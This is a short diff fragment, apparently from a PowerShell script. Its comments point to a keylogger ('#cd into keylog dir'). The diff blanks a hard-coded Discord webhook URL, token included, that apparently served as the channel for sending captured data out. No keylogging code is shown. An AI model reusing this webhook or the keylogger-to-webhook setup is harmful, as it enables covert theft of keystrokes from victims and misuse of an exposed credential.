@@ -2,7 +2,7 @@
 
 
 #webhook
-$webhook = "https://discordapp.com/api/webhooks/1047984722875252807/hVISELqFsYlkRUkbYdWoONvvbG26bRxyk-gM1S-pAOejL4Vj-xQ6Iza8HpKHbMV8kpqt"
+$webhook = ""
 
 #cd into keylog dir
 
